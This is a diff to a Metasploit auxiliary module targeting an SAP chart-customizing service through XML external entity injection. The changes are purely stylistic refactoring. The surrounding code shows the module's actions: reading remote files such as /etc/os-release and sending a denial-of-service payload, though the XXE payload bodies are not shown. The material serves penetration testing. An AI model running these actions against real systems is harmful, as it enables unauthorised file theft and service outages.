@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     @data_xml = {
       name: Rex::Text.rand_text_alphanumeric(12),
-      filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
+      filename: "#{Rex::Text.rand_text_alphanumeric(12)}.xml",
       data: nil
     }
     @data_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
@@ -81,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
     </ChartData>)
     @xxe_xml = {
       name: Rex::Text.rand_text_alphanumeric(12),
-      filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
+      filename: "#{Rex::Text.rand_text_alphanumeric(12)}.xml",
       data: nil
     }
   end
@@ -101,7 +101,7 @@ class MetasploitModule < Msf::Auxiliary
     </SAPChartCustomizing>)
   end
 
-  def make_post_data(file_name, dos = false)
+  def make_post_data(file_name, dos: false)
     if !dos
       make_xxe_xml(file_name)
     else
@@ -215,14 +215,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-
     # Set up variables
     os_release = ''
     os_release_file = '/etc/os-release'
 
     # Set up XML data for HTTP request
     setup_xml_and_variables
-    make_post_data(os_release_file, false) # Create a XML data payload to retrieve the value of /etc/os-release
+    make_post_data(os_release_file, dos: false) # Create a XML data payload to retrieve the value of /etc/os-release
     # so that the module can check if the target is vulnerable or not.
 
     # Get OS release information
@@ -294,10 +293,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_file_read
-
     # Set up XML data for HTTP request
     setup_xml_and_variables
-    make_post_data(@file, false)
+    make_post_data(@file, dos: false)
 
     # Download remote file
     first_response = send_first_request
@@ -349,10 +347,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_dos
-
     # Set up XML data for HTTP request
     setup_xml_and_variables
-    make_post_data(@file, true)
+    make_post_data(@file, dos: true)
 
     # Send HTTP request
     begin
@@ -389,7 +386,6 @@ class MetasploitModule < Msf::Auxiliary
 
     # Check HTTP response
     fail_with(Failure::NotVulnerable, 'The target responded with a 200 OK response code. The DoS attempt was unsuccessful.') unless dos_response.code != 200
-
   end
 
 end
